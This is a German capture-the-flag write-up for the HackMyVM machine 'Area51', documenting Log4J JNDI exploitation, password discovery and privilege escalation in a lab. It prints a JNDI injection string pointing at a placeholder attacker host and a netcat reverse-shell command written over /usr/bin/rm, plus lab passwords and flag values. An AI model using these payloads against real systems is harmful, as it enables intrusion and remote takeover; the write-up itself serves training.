# Area51 - HackMyVM Writeup

![Area51 Icon](Area51.png)

Dies ist ein Writeup für die HackMyVM-Maschine "Area51", erstellt von DarkSpirit. Die Maschine ist als "Medium" eingestuft und erfordert die Ausnutzung einer bekannten Schwachstelle (Log4J) für den initialen Zugriff sowie die Nutzung schwacher Berechtigungen für die Privilegieneskalation.

**VM Link:** [Area51 auf HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Area51)
**Autor der VM:** DarkSpirit
**Original Writeup:** [Ben C. - Cyber Security Reports](https://alientec1908.github.io/Area51_HackMyVM_Medium/)
**Datum des Berichts:** 20. Juni 2025

---

**Disclaimer:**

Dieser Writeup dient ausschließlich zu Bildungszwecken und dokumentiert Techniken, die in einer kontrollierten Testumgebung (HackTheBox/HackMyVM) angewendet wurden. Die Anwendung dieser Techniken auf Systeme, für die keine ausdrückliche Genehmigung vorliegt, ist illegal und ethisch nicht vertretbar. Der Autor und der Ersteller dieses README übernehmen keine Verantwortung für jeglichen Missbrauch der hier beschriebenen Informationen.

---

## Zusammenfassung

Die Box "Area51" erforderte zunächst eine gründliche Enumeration der offenen Dienste, insbesondere der Webserver auf den Ports 80 und 8080. Ein entscheidender Hinweis wurde in einer Textdatei auf Port 80 gefunden, der auf eine Log4J-Schwachstelle in einer Java-Anwendung auf Port 8080 hindeutete. Die erfolgreiche Ausnutzung dieser Schwachstelle führte zu einer initialen Root-Shell.

Von der initialen Root-Shell aus wurden Systeminformationen gesammelt, wobei versteckte Dateien durchsucht und ein Passwort für den Benutzer `roger` gefunden wurde. Dies ermöglichte den Zugang via SSH.

Als Benutzer `roger` wurde das System weiter erkundet. Dabei wurde ein weiterer Benutzer (`kang`) und eine kritische Schwachstelle in den Dateiberechtigungen (`/etc/pam.d/kang`) gefunden, die ein Passwort für `kang` enthielt und roger Schreibrechte gab. Nach dem Wechsel zum Benutzer `kang` wurde eine globale Schreibberechtigung auf `/usr/bin/rm` ausgenutzt, um diesen durch eine Reverse Shell zu ersetzen und so die endgültige Root-Privilegieneskalation zu erreichen.

## Technische Details

*   **Betriebssystem:** Debian (basierend auf Nmap-Erkennung und SSH-Banner)
*   **Offene Ports:**
    *   `22/tcp`: SSH (OpenSSH 8.4p1 Debian 5)
    *   `80/tcp`: HTTP (Apache httpd 2.4.51)
    *   `8080/tcp`: HTTP (Nagios NSCA / vermutete Java/Spring-Anwendung)

## Enumeration

1.  **ARP-Scan:** Identifizierung der Ziel-IP im Netzwerk.
2.  **Nmap Scan:** Ermittlung offener Ports und Dienste. Ports 22, 80 und 8080 waren offen.
3.  **Web Enumeration (Port 80):**
    *   `curl`: Überprüfung der Header.
    *   `nikto`: Fund von fehlenden Sicherheits-Headern, ETag-Informationen und veralteter Apache-Version.
    *   `gobuster`: Entdeckung der Verzeichnisse `/video`, `/radar`, `/moon` und der Datei `/note.txt`.
    *   `/note.txt` enthielt den kritischen Hinweis: "Alert! We have a vulnerability in our java application... Notify the programming department to check Log4J."
    *   Die Webseite auf Port 80 zeigte ein FBI-Login-Formular, das jedoch client-seitig via JavaScript (`script.js`) validierte und keine serverseitige Authentifizierung durchführte.
4.  **Web Enumeration (Port 8080):**
    *   `curl`: Zeigt "Whitelabel Error Page" bei direktem Zugriff.
    *   `nikto`: Fehlende Sicherheits-Header, erlaubte HTTP-Methoden wie `PUT` und `DELETE`, was auf potenzielle Risiken hindeutet.
    *   `gobuster`: Findet das `/error`-Verzeichnis.
    *   Basierend auf `note.txt` und dem Dienst (Nagios NSCA, oft in Java-Umgebungen) wurde Log4J als potenzielle Schwachstelle auf Port 8080 vermutet.

## Ausnutzung (Initialer Zugriff - Root)

1.  **Log4J Schwachstelle:** Die Vermutung bestätigte sich. Die Java-Anwendung auf Port 8080 war anfällig für Log4J JNDI Injection (CVE-2021-44228).
2.  **Payload Vorbereitung:** Eine Reverse Shell Java-Klasse (`Exploit.java`) wurde erstellt und kompiliert. Tools wie `marshalsec` oder `log4j-shell-poc` wurden vorbereitet, um einen bösartigen LDAP/HTTP-Server aufzusetzen, der die kompilierte Klasse ausliefert.
3.  **Exploit Trigger:** Durch das Senden eines JNDI-Strings, z.B. `${jndi:ldap://ANGREIFER_IP:1389/a}`, in einem anfälligen Header wie `X-Api-Version` an Port 8080 wurde die Schwachstelle getriggert. Die Anwendung führte den JNDI-Lookup aus, verband sich mit dem bösartigen LDAP-Server, der auf den HTTP-Server des Angreifers verlinkte, woraufhin die `Exploit.class` geladen und die Reverse Shell ausgeführt wurde.
4.  **Ergebnis:** Eine Reverse Shell wurde auf dem Lauschport des Angreifers (Port 4444 im Beispiel) als Benutzer `root` empfangen.

## Post-Exploitation & Lateral Movement (Root -> roger -> kang)

1.  **Erste Root-Shell:** Nach Erhalt der Root-Shell wurde das Dateisystem erkundet. Die Suche nach versteckten Dateien mittels `find / -type f -name ".*" 2>/dev/null` enthüllte die Datei `/var/tmp/.roger`.
2.  **Passwortfund:** Der Inhalt von `/var/tmp/.roger` war `b3st4l13n`, was wie ein Passwort aussah.
3.  **Zugang als Benutzer `roger`:** Basierend auf dem Dateinamen und dem gefundenen Passwort wurde versucht, sich via SSH als Benutzer `roger` anzumelden. Dies war erfolgreich.
4.  **Erkundung als `roger`:** Als `roger` wurde weiter nach Schwachstellen gesucht. `sudo -l` zeigte, dass `roger` keine sudo-Berechtigungen hatte. Die Suche nach global schreibbaren Dateien (`find / -type f -perm -o=w 2>/dev/null`) enthüllte unter anderem `/usr/bin/rm`.
5.  **Fund von Benutzer `kang`:** Die Suche nach dem String "kang" im `/etc`-Verzeichnis mittels `grep -r "kang" /etc` offenbarte die Existenz des Benutzers `kang` und die Datei `/etc/pam.d/kang`.
6.  **Schwachstelle in `/etc/pam.d/kang`:** Die Berechtigungen für `/etc/pam.d/kang` (`-rwxrwx--- 1 roger roger`) zeigten, dass der Benutzer `roger` Schreib- und Ausführungsrechte für diese Datei besaß.
7.  **Passwort für `kang`:** Der Inhalt von `/etc/pam.d/kang` war `k4ng1sd4b3st`.
8.  **Wechsel zu Benutzer `kang`:** Mit dem gefundenen Passwort wurde erfolgreich mittels `su kang` zum Benutzer `kang` gewechselt.
9.  **Erkundung als `kang`:** Als `kang` wurde erneut `sudo -l` geprüft, was ebenfalls keine sudo-Berechtigungen zeigte.

## Privilegieneskalation (kang -> Root)

1.  **Ausnutzung schreibbarer `/usr/bin/rm`:** Als Benutzer `kang`, der indirekt (über die globale Schreibberechtigung, gefunden als `roger`) auf `/usr/bin/rm` schreiben konnte, wurde die Datei `/usr/bin/rm` durch einen Reverse Shell Payload ersetzt (`echo 'nc ANGREIFER_IP 9001 -e /bin/bash' > /usr/bin/rm`).
2.  **Trigger:** Es ist anzunehmen, dass ein Prozess oder ein Nutzer mit Root-Rechten anschließend den Befehl `rm` ausführte, was dazu führte, dass stattdessen der Reverse Shell Payload ausgeführt wurde.
3.  **Ergebnis:** Eine zweite Root-Shell wurde auf dem Lauschport des Angreifers (Port 9001 im Beispiel) empfangen.

## Flags

*   **user.txt:** `ee11cbb19052e40b07aac0ca060c23ee` (Gefunden unter `/home/roger/user.txt`)
*   **root.txt:** `63a9f0ea7bb98050796b649e85481845` (Gefunden unter `/root/root.txt`)

---

Dieses Writeup wurde erstellt von [Ben C. - Cyber Security Reports](https://alientec1908.github.io/Area51_HackMyVM_Medium/).
